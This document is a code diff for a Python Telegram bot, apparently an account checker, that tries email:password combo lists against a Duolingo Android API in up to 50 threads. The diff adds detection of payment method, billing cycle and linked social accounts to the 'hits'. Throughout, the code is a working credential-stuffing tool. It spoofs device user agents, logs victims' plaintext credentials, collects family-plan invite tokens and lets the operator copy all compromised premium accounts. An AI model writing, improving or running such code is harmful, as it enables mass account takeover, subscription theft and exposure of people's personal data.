@@ -67,6 +67,61 @@ def generate_ua():
     models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro"]
     return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"
 
+def detect_payment_method(data):
+    """Detect payment method from subscription data"""
+    shop_items = data.get("shopItems", [])
+    payment_method = "Unknown 💳"
+    
+    for item in shop_items:
+        sub_info = item.get("subscriptionInfo", {})
+        if sub_info:
+            # Check for payment method indicators
+            sku = sub_info.get("productId", "").lower()
+            
+            if "google" in sku or "android" in sku:
+                payment_method = "Google Play 🟢"
+            elif "apple" in sku or "ios" in sku or "itunes" in sku:
+                payment_method = "Apple App Store 🍎"
+            elif "paypal" in sku:
+                payment_method = "PayPal 💙"
+            elif "visa" in sku or "mastercard" in sku or "amex" in sku:
+                payment_method = "Credit Card 💳"
+            elif "direct" in sku:
+                payment_method = "Direct Debit 🏦"
+            
+            # Check receipt data if available
+            receipt = sub_info.get("receipt", {})
+            if receipt:
+                if "google" in str(receipt).lower():
+                    payment_method = "Google Play 🟢"
+                elif "apple" in str(receipt).lower():
+                    payment_method = "Apple App Store 🍎"
+    
+    return payment_method
+
+def detect_social_links(data):
+    """Detect linked social accounts"""
+    social_links = []
+    
+    # Check for linked accounts
+    linked_accounts = data.get("linkedAccounts", [])
+    for account in linked_accounts:
+        provider = account.get("provider", "").lower()
+        if "google" in provider:
+            social_links.append("Google 🔴")
+        elif "facebook" in provider:
+            social_links.append("Facebook 🔵")
+        elif "apple" in provider:
+            social_links.append("Apple ID 🍎")
+    
+    # Check user profile for social info
+    if data.get("hasFacebookId"):
+        social_links.append("Facebook 🔵")
+    if data.get("hasGoogleId"):
+        social_links.append("Google 🔴")
+    
+    return social_links if social_links else ["None ❌"]
+
 def is_premium_account(data):
     shop_items = data.get("shopItems", [])
     for item in shop_items:
@@ -96,7 +151,9 @@ def extract_subscription_details(data):
         "product_id": "Unknown",
         "renewing": "Unknown",
         "expiry": "Unknown",
-        "invite_token": None
+        "invite_token": None,
+        "payment_method": "Unknown",
+        "billing_cycle": "Unknown"
     }
     
     shop_items = data.get("shopItems", [])
@@ -105,6 +162,14 @@ def extract_subscription_details(data):
         if sub_info:
             if sub_info.get("productId"):
                 details["product_id"] = sub_info.get("productId")
+                # Detect billing cycle from product ID
+                pid = sub_info.get("productId", "").lower()
+                if "monthly" in pid or "month" in pid:
+                    details["billing_cycle"] = "Monthly 📅"
+                elif "yearly" in pid or "annual" in pid or "year" in pid:
+                    details["billing_cycle"] = "Yearly 📆"
+                elif "weekly" in pid or "week" in pid:
+                    details["billing_cycle"] = "Weekly 📅"
             if sub_info.get("renewing") is not None:
                 details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
             if sub_info.get("expectedExpiration"):
@@ -114,6 +179,9 @@ def extract_subscription_details(data):
         family_info = item.get("familyPlanInfo", {})
         if family_info and family_info.get("inviteToken"):
             details["invite_token"] = family_info.get("inviteToken")
+    
+    # Detect payment method
+    details["payment_method"] = detect_payment_method(data)
     
     return details
 
@@ -156,7 +224,7 @@ def check_single_account(email, password):
         if not jwt_token:
             return email, password, "FAIL", "no jwt token", None
         
-        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CcreatedAt"
+        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CcreatedAt%2ClinkedAccounts%2ChasFacebookId%2ChasGoogleId"
         
         profile_headers = get_headers(ua, jwt_token)
         
@@ -187,6 +255,10 @@ def check_single_account(email, password):
         
         is_premium, plan_type, invite_token = is_premium_account(data)
         
+        # Get social links
+        social_links = detect_social_links(data)
+        social_text = ", ".join(social_links)
+        
         if not is_premium:
             return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None
         
@@ -194,60 +266,53 @@ def check_single_account(email, password):
         if invite_token:
             sub_details["invite_token"] = invite_token
         
+        # Compact but detailed format
         if plan_type == "FAMILY":
             result = f"""
-╔════════════════════════════════════╗
-║      🎉 PREMIUM ACCOUNT FOUND      ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║   🎉 PREMIUM FAMILY PLAN FOUND 🎉    ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│        👨‍👩‍👧 FAMILY PLAN           │
-├────────────────────────────────────┤
-│  📧 Email    : `{email}:{password}` │
-│  👤 Username : `{username}`         │
-│  ⭐ XP       : `{total_xp:,}`       │
-│  🔥 Streak   : `{streak} days`      │
-│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
-│  📅 Created  : `{created_date}`     │
-└────────────────────────────────────┘
-
-┌────────────────────────────────────┐
-│         💎 SUBSCRIPTION            │
-├────────────────────────────────────┤
-│  Product    : `{sub_details['product_id']}` │
-│  Renew      : `{sub_details['renewing']}`   │
-│  Expires    : `{sub_details['expiry']}`     │
-└────────────────────────────────────┘
-"""
+┌──────────────────────────────────────┐
+│  📧 {email}:{password}
+├──────────────────────────────────────┤
+│  👤 {username}  │  ⭐ {total_xp:,} XP
+│  🔥 {streak} days  │  🌍 {learning_lang}→{from_lang}
+│  📅 Joined: {created_date}
+├──────────────────────────────────────┤
+│  💎 {sub_details['product_id']}
+│  💳 {sub_details['payment_method']}
+│  📆 {sub_details['billing_cycle']}
+│  🔄 {sub_details['renewing']}
+│  ⏰ Expires: {sub_details['expiry']}
+├──────────────────────────────────────┤
+│  🔗 Social: {social_text}
+└──────────────────────────────────────┘"""
             if sub_details["invite_token"]:
-                result += f"\n🔗 **INVITE LINK:**\n`https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}`"
+                result += f"\n🔗 Invite: `https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}`"
         else:
             result = f"""
-╔════════════════════════════════════╗
-║      🎉 PREMIUM ACCOUNT FOUND      ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║    🎉 PREMIUM SUPER PLAN FOUND 🎉    ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│           👑 SUPER PREMIUM         │
-├────────────────────────────────────┤
-│  📧 Email    : `{email}:{password}` │
-│  👤 Username : `{username}`         │
-│  ⭐ XP       : `{total_xp:,}`       │
-│  🔥 Streak   : `{streak} days`      │
-│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
-│  📅 Created  : `{created_date}`     │
-└────────────────────────────────────┘
-
-┌────────────────────────────────────┐
-│         💎 SUBSCRIPTION            │
-├────────────────────────────────────┤
-│  Product    : `{sub_details['product_id']}` │
-│  Renew      : `{sub_details['renewing']}`   │
-│  Expires    : `{sub_details['expiry']}`     │
-└────────────────────────────────────┘
-"""
+┌──────────────────────────────────────┐
+│  📧 {email}:{password}
+├──────────────────────────────────────┤
+│  👤 {username}  │  ⭐ {total_xp:,} XP
+│  🔥 {streak} days  │  🌍 {learning_lang}→{from_lang}
+│  📅 Joined: {created_date}
+├──────────────────────────────────────┤
+│  💎 {sub_details['product_id']}
+│  💳 {sub_details['payment_method']}
+│  📆 {sub_details['billing_cycle']}
+│  🔄 {sub_details['renewing']}
+│  ⏰ Expires: {sub_details['expiry']}
+├──────────────────────────────────────┤
+│  🔗 Social: {social_text}
+└──────────────────────────────────────┘"""
         
-        result += f"\n\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
+        result += f"\n\n🦉 Checked by: DUOLINGO CHECKER"
         
         return email, password, "HIT", result, plan_type
         
@@ -263,37 +328,32 @@ def send_main_menu(chat_id):
     admin_name = "thuyaaungzaw"
     
     menu_text = f"""
-╔════════════════════════════════════╗
-║       🦉 DUOLINGO PREMIUM          ║
-║          ACCOUNT CHECKER           ║
-║            BY ThuYa V3             ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║        🦉 DUOLINGO CHECKER V3        ║
+║              Thu Ya Aung Zaw         ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│           👤 USER PROFILE          │
-├────────────────────────────────────┤
-│  Name     : @{admin_name}          │
-│  ID       : {ADMIN_IDS[0]}         │
-│  Role     : 👑 Premium Owner       │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│  👑 Owner: @{admin_name}
+│  🤖 Bot: Premium Checker
+└──────────────────────────────────────┘
 
-┌────────────────────────────────────┐
-│          ⚙️ SYSTEM STATUS          │
-├────────────────────────────────────┤
-│  Gateways : 🟢 {MAX_THREADS}/50 Online │
-│  Mode     : 🔥 Active              │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│  ⚙️ Threads: {MAX_THREADS}/50  │  🟢 Active
+│  📊 Batch: {PROGRESS_INTERVAL} combos
+└──────────────────────────────────────┘
 
-┌────────────────────────────────────┐
-│           📊 QUICK STATS           │
-├────────────────────────────────────┤
-│  Today HIT   : 👑 {super_count}  👨‍👩‍👧 {family_count} │
-│  Total HIT   : {total_hits}        │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│  📈 Today's Hits:
+│  ├ 👑 SUPER: {super_count}
+│  └ 👨‍👩‍👧 FAMILY: {family_count}
+│  
+│  💾 Total Saved: {total_hits}
+└──────────────────────────────────────┘
 """
     
     markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("🚀 START CHECKING", callback_data="start_check"))
+    markup.add(InlineKeyboardButton("🚀 START", callback_data="start_check"))
     markup.row(
         InlineKeyboardButton("📊 STATS", callback_data="my_stats"),
         InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
@@ -310,14 +370,56 @@ def send_hits_list(chat_id, page=0):
     
     total_hits = len(all_super_hits) + len(all_family_hits)
     if total_hits == 0:
-        bot.send_message(chat_id, "📭 No premium hits yet.", parse_mode='Markdown')
+        bot.send_message(chat_id, "📭 No premium hits yet.\n\nSend a combo file to start!", parse_mode='Markdown')
         return
     
     all_hits = []
     for email, pwd, result in all_super_hits:
-        all_hits.append(("👑 SUPER", email, pwd))
+        # Extract compact info from result
+        lines = result.split('\n')
+        username = "Unknown"
+        xp = "0"
+        streak = "0"
+        expiry = "Unknown"
+        payment = "Unknown"
+        for line in lines:
+            if '👤' in line and '│' in line:
+                parts = line.split('│')
+                for part in parts:
+                    if '👤' in part:
+                        username = part.replace('👤', '').strip()
+                    if '⭐' in part:
+                        xp = part.replace('⭐', '').replace('XP', '').strip()
+                    if '🔥' in part:
+                        streak = part.replace('🔥', '').replace('days', '').strip()
+            if '⏰ Expires:' in line:
+                expiry = line.split('⏰ Expires:')[1].strip()
+            if '💳' in line and '💳' in line:
+                payment = line.split('💳')[1].strip()
+        all_hits.append(("👑 SUPER", email, pwd, username, xp, streak, expiry, payment))
+    
     for email, pwd, result in all_family_hits:
-        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd))
+        lines = result.split('\n')
+        username = "Unknown"
+        xp = "0"
+        streak = "0"
+        expiry = "Unknown"
+        payment = "Unknown"
+        for line in lines:
+            if '👤' in line and '│' in line:
+                parts = line.split('│')
+                for part in parts:
+                    if '👤' in part:
+                        username = part.replace('👤', '').strip()
+                    if '⭐' in part:
+                        xp = part.replace('⭐', '').replace('XP', '').strip()
+                    if '🔥' in part:
+                        streak = part.replace('🔥', '').replace('days', '').strip()
+            if '⏰ Expires:' in line:
+                expiry = line.split('⏰ Expires:')[1].strip()
+            if '💳' in line:
+                payment = line.split('💳')[1].strip()
+        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd, username, xp, streak, expiry, payment))
     
     total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
     if page >= total_pages:
@@ -329,38 +431,40 @@ def send_hits_list(chat_id, page=0):
     end = min(start + hits_per_page, len(all_hits))
     
     hit_list_text = ""
-    for i, (plan, email, pwd) in enumerate(all_hits[start:end], start=start+1):
-        hit_list_text += f"  {i}. {plan} │ `{email}:{pwd}`\n"
+    for i, (plan, email, pwd, username, xp, streak, expiry, payment) in enumerate(all_hits[start:end], start=start+1):
+        hit_list_text += f"""┌─[{i}] {plan}
+├ 📧 `{email}:{pwd}`
+├ 👤 {username[:20]}
+├ ⭐ {xp} XP │ 🔥 {streak}d
+├ 💳 {payment[:15]}
+└ ⏰ {expiry[:10]}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
     
     message_text = f"""
-╔════════════════════════════════════╗
-║           💾 PREMIUM HITS          ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║           💾 PREMIUM HITS            ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│  👑 SUPER PREMIUM : {len(all_super_hits)}    │
-│  👨‍👩‍👧 FAMILY PLAN : {len(all_family_hits)}    │
-└────────────────────────────────────┘
-
-📋 Page {page+1}/{total_pages}
+📊 SUPER: {len(all_super_hits)}  │  FAMILY: {len(all_family_hits)}
+📄 Page {page+1}/{total_pages}
 
 {hit_list_text}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💡 Click COPY ALL to get full details
 """
     
     markup = InlineKeyboardMarkup(row_width=3)
     buttons = []
     if page > 0:
-        buttons.append(InlineKeyboardButton("◀️ PREV", callback_data=f"hits_page_{page-1}"))
+        buttons.append(InlineKeyboardButton("◀️", callback_data=f"hits_page_{page-1}"))
     buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1:
-        buttons.append(InlineKeyboardButton("NEXT ▶️", callback_data=f"hits_page_{page+1}"))
+        buttons.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
     markup.row(*buttons)
     markup.row(
         InlineKeyboardButton("📋 COPY ALL", callback_data="copy_all_hits"),
         InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits"),
-        InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu")
+        InlineKeyboardButton("🏠 MAIN", callback_data="main_menu")
     )
     
     bot.send_message(chat_id, message_text, parse_mode='Markdown', reply_markup=markup)
@@ -373,35 +477,36 @@ def send_stats(chat_id):
     total_checked = super_count + family_count + free_count + fail_count
     
     stats_text = f"""
-╔════════════════════════════════════╗
-║            📊 STATISTICS           ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║            📊 STATISTICS             ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│           TODAY'S STATS            │
-├────────────────────────────────────┤
-│  👑 SUPER PREMIUM : {super_count}         │
-│  👨‍👩‍👧 FAMILY PLAN : {family_count}         │
-│  ⚠️ FREE ACCOUNTS : {free_count}          │
-│  ❌ FAILED       : {fail_count}           │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│           TODAY'S RESULTS            │
+├──────────────────────────────────────┤
+│  👑 SUPER PREMIUM : {super_count}
+│  👨‍👩‍👧 FAMILY PLAN : {family_count}
+│  ⚠️ FREE ACCOUNTS : {free_count}
+│  ❌ FAILED       : {fail_count}
+└──────────────────────────────────────┘
 
-┌────────────────────────────────────┐
-│           TOTAL STATS              │
-├────────────────────────────────────┤
-│  📋 CHECKED      : {total_checked}        │
-│  🎯 TOTAL HITS   : {total_hits}           │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│             TOTALS                   │
+├──────────────────────────────────────┤
+│  📋 CHECKED : {total_checked}
+│  🎯 HITS    : {total_hits}
+│  📈 RATIO   : {round(total_hits/total_checked*100, 2) if total_checked > 0 else 0}%
+└──────────────────────────────────────┘
 
-┌────────────────────────────────────┐
-│           SYSTEM INFO              │
-├────────────────────────────────────┤
-│  ⚙️ THREADS      : {MAX_THREADS}          │
-│  🟢 STATUS       : Online          │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│             SYSTEM                   │
+├──────────────────────────────────────┤
+│  ⚙️ THREADS : {MAX_THREADS}
+│  🟢 STATUS  : {'CHECKING' if checking_active else 'IDLE'}
+└──────────────────────────────────────┘
 """
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
+    markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
     bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -413,7 +518,7 @@ def callback_handler(call):
     if call.data == "start_check":
         bot.answer_callback_query(call.id)
         if checking_active:
-            bot.send_message(call.message.chat.id, "⚠️ A check is already running. Use /stop first.")
+            bot.send_message(call.message.chat.id, "⚠️ Check running! Use /stop first.")
             return
         bot.send_message(call.message.chat.id, "📎 Send your *email:pass* combo file (.txt)", parse_mode='Markdown')
     
@@ -429,11 +534,11 @@ def callback_handler(call):
         bot.answer_callback_query(call.id)
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
-            InlineKeyboardButton("⚙️ SET THREADS", callback_data="thread_settings"),
+            InlineKeyboardButton("⚙️ THREADS", callback_data="thread_settings"),
             InlineKeyboardButton("🗑️ CLEAR HITS", callback_data="clear_hits")
         )
-        markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
-        bot.send_message(call.message.chat.id, "⚙️ **SETTINGS MENU**\n━━━━━━━━━━━━━━━━━━\nSelect an option:", parse_mode='Markdown', reply_markup=markup)
+        markup.add(InlineKeyboardButton("🏠 MAIN", callback_data="main_menu"))
+        bot.send_message(call.message.chat.id, "⚙️ **SETTINGS**\n━━━━━━━━━━━━━━━━", parse_mode='Markdown', reply_markup=markup)
     
     elif call.data == "thread_settings":
         bot.answer_callback_query(call.id)
@@ -444,12 +549,12 @@ def callback_handler(call):
             InlineKeyboardButton("50", callback_data="set_threads_50")
         )
         markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
-        bot.send_message(call.message.chat.id, f"⚙️ Current Threads: `{MAX_THREADS}`\nSelect new value:", parse_mode='Markdown', reply_markup=markup)
+        bot.send_message(call.message.chat.id, f"⚙️ Current: `{MAX_THREADS}` threads\nSelect new value:", parse_mode='Markdown', reply_markup=markup)
     
     elif call.data.startswith("set_threads_"):
         new_threads = int(call.data.split("_")[2])
         MAX_THREADS = new_threads
-        bot.answer_callback_query(call.id, f"Threads set to {new_threads}")
+        bot.answer_callback_query(call.id, f"✓ Threads set to {new_threads}")
         send_main_menu(call.message.chat.id)
     
     elif call.data == "clear_hits":
@@ -480,17 +585,17 @@ def callback_handler(call):
     
     elif call.data == "copy_all_hits":
         bot.answer_callback_query(call.id)
-        all_hits_text = ""
+        all_hits_text = "🔰 DUOLINGO PREMIUM HITS 🔰\n" + "="*40 + "\n\n"
         for email, pwd, result in all_super_hits:
-            all_hits_text += f"{email}:{pwd}\n"
+            all_hits_text += f"👑 SUPER\n📧 {email}:{pwd}\n{'-'*30}\n"
         for email, pwd, result in all_family_hits:
-            all_hits_text += f"{email}:{pwd}\n"
+            all_hits_text += f"👨‍👩‍👧 FAMILY\n📧 {email}:{pwd}\n{'-'*30}\n"
         
         if all_hits_text:
             if len(all_hits_text) > 4000:
                 parts = [all_hits_text[i:i+4000] for i in range(0, len(all_hits_text), 4000)]
                 for i, part in enumerate(parts):
-                    bot.send_message(call.message.chat.id, f"📋 **Premium Hits (Part {i+1}/{len(parts)}):**\n```\n{part}```", parse_mode='Markdown')
+                    bot.send_message(call.message.chat.id, f"📋 **Hits Part {i+1}/{len(parts)}:**\n```\n{part}```", parse_mode='Markdown')
             else:
                 bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode='Markdown')
         else:
@@ -517,7 +622,6 @@ def process_combos(chat_id, combos):
     all_family_hits = []
     all_free_accounts = []
     
-    # Reset batch counters
     last_batch_super = 0
     last_batch_family = 0
     last_batch_free = 0
@@ -528,7 +632,7 @@ def process_combos(chat_id, combos):
     start_time = time.time()
     last_update = 0
     
-    status_msg = bot.send_message(chat_id, "🔄 Starting check...")
+    status_msg = bot.send_message(chat_id, "🔄 Starting checker...")
     
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         current_executor = executor
@@ -573,73 +677,63 @@ def process_combos(chat_id, combos):
                 last_batch_fail += 1
                 logging.info(f"❌ FAIL: {email}")
             
-            # Update progress every 1000 combos
             if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                 last_update = completed
                 bar_length = int(percent / 5)
                 progress_bar = "▓" * bar_length + "░" * (20 - bar_length)
+                speed = completed / elapsed if elapsed > 0 else 0
                 
                 progress_text = f"""
-╔════════════════════════════════════╗
-║         🦉 CHECKING STATUS         ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║         🦉 CHECKING STATUS           ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│  ⏱️ Time     : {elapsed:.1f}s              │
-│  📍 Checked  : {completed:,}/{total:,}    │
-│  🚀 Threads  : {MAX_THREADS}               │
-└────────────────────────────────────┘
+⏱️ {elapsed:.0f}s  │  🚀 {int(speed)}/s  │  🧵 {MAX_THREADS}
 
-[{progress_bar}] {percent:.1f}%
+[{progress_bar}] {percent:.0f}%
+📊 {completed:,}/{total:,}
 
-┌────────────────────────────────────┐
-│  👑 SUPER     : {super_count:,}           │
-│  👨‍👩‍👧 FAMILY   : {family_count:,}           │
-│  ⚠️ FREE      : {free_count:,}           │
-│  ❌ FAIL      : {fail_count:,}           │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│  👑 SUPER : {super_count:,}
+│  👨‍👩‍👧 FAMILY : {family_count:,}
+│  ⚠️ FREE  : {free_count:,}
+│  ❌ FAIL  : {fail_count:,}
+└──────────────────────────────────────┘
 
-📊 **Last {PROGRESS_INTERVAL} checked:**
-   👑 {last_batch_super} HIT  |  👨‍👩‍👧 {last_batch_family} FAMILY
-   ⚠️ {last_batch_free} FREE  |  ❌ {last_batch_fail} FAIL
+📈 Last {PROGRESS_INTERVAL}:
+   👑+{last_batch_super}  👨‍👩‍👧+{last_batch_family}
+   ⚠️+{last_batch_free}  ❌+{last_batch_fail}
 
-💡 Use /stop to cancel
+⚡ /stop to cancel
 """
                 try:
                     bot.edit_message_text(progress_text, status_msg.message_id, chat_id, parse_mode='Markdown')
                 except:
                     pass
                 
-                # Reset batch counters
                 last_batch_super = 0
                 last_batch_family = 0
                 last_batch_free = 0
                 last_batch_fail = 0
     
-    # Final summary
     elapsed = time.time() - start_time
     total_hits = super_count + family_count
     final_text = f"""
-╔════════════════════════════════════╗
-║         ✅ CHECK COMPLETED         ║
-╚════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║         ✅ CHECK COMPLETED           ║
+╚══════════════════════════════════════╝
 
-┌────────────────────────────────────┐
-│  ⏱️ Time     : {elapsed:.1f}s              │
-│  📍 Total    : {total:,}                   │
-│  🚀 Threads  : {MAX_THREADS}               │
-└────────────────────────────────────┘
+⏱️ Time: {elapsed:.1f}s  │  📍 Total: {total:,}
+🎯 Hits: {total_hits}  │  📈 Rate: {round(total_hits/total*100,2) if total>0 else 0}%
 
-┌────────────────────────────────────┐
-│  👑 SUPER PREMIUM : {super_count:,}         │
-│  👨‍👩‍👧 FAMILY PLAN : {family_count:,}         │
-│  ⚠️ FREE ACCOUNTS : {free_count:,}          │
-│  ❌ FAILED       : {fail_count:,}           │
-└────────────────────────────────────┘
+┌──────────────────────────────────────┐
+│  👑 SUPER : {super_count:,}
+│  👨‍👩‍👧 FAMILY : {family_count:,}
+│  ⚠️ FREE  : {free_count:,}
+│  ❌ FAIL  : {fail_count:,}
+└──────────────────────────────────────┘
 
-💾 Total Hits: {total_hits:,}
-
-Click 💾 HITS in main menu to view all premium accounts
+💾 Premium hits saved! Click 💾 HITS to view.
 """
     bot.send_message(chat_id, final_text, parse_mode='Markdown')
     send_main_menu(chat_id)
@@ -671,7 +765,7 @@ def stop_command(message):
                 future.cancel()
         if current_executor:
             current_executor.shutdown(wait=False, cancel_futures=True)
-        bot.reply_to(message, "🛑 **Stopped immediately!**", parse_mode='Markdown')
+        bot.reply_to(message, "🛑 **Stopped!**", parse_mode='Markdown')
     else:
         bot.reply_to(message, "ℹ️ No active check.")
 
@@ -687,7 +781,7 @@ def handle_file(message):
         bot.reply_to(message, "⚠️ Check running. Use /stop first.")
         return
     
-    status_msg = bot.reply_to(message, "📥 Downloading...")
+    status_msg = bot.reply_to(message, "📥 Downloading file...")
     
     file_info = bot.get_file(message.document.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
@@ -701,20 +795,19 @@ def handle_file(message):
             combos.append((email.strip(), pwd.strip()))
     
     if not combos:
-        bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
+        bot.edit_message_text("❌ No valid combos found.\nFormat: email:pass", status_msg.chat.id, status_msg.message_id)
         return
     
-    bot.edit_message_text(f"📥 `{len(combos):,}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...\n📊 Update every {PROGRESS_INTERVAL} combos", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
+    bot.edit_message_text(f"✅ `{len(combos):,}` combos loaded\n🚀 {MAX_THREADS} threads\n📊 Update every {PROGRESS_INTERVAL}", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
     
     thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
     thread.daemon = True
     thread.start()
 
-print("🤖 Duolingo Premium Checker Bot is running...")
+print("🤖 Duolingo Premium Checker V3")
 print("═" * 50)
-print(f"  Admin IDs: {ADMIN_IDS}")
+print(f"  Admin: {ADMIN_IDS}")
 print(f"  Threads: {MAX_THREADS}")
-print(f"  Progress Interval: {PROGRESS_INTERVAL} combos")
-print(f"  Features: Box UI | Inline Menu | No TXT Files")
+print(f"  Features: Payment Detection | Social Links | Compact UI")
 print("═" * 50)
 bot.infinity_polling()
